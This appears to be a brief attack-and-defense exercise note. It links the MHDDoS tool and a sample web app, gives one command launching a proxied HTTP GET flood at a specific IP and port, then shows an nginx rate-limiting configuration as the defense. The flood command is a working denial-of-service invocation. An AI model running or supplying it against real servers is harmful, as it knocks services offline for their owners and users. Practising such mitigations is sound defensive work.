**https://github.com/MatrixTM/MHDDoS**

**https://github.com/rajendra0968jangid/fruits**



**python3 start.py GET http://100.53.177.164:5173 5 2500 socks5.txt 100 60**


# Defense

**Step 1**
sudo apt install nginx -y

sudo nano /etc/nginx/nginx.conf

*(put in http{})*

limit_req_zone $binary_remote_addr zone=mylimit:10m rate=20r/s;

**Step 2**

sudo nano /etc/nginx/sites-available/default

server {
    listen 80;

    location / {
        limit_req zone=mylimit burst=30 nodelay;

        proxy_pass http://localhost:5173;

        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
    }
}

**Step 3**

sudo nginx -t

sudo systemctl restart nginx





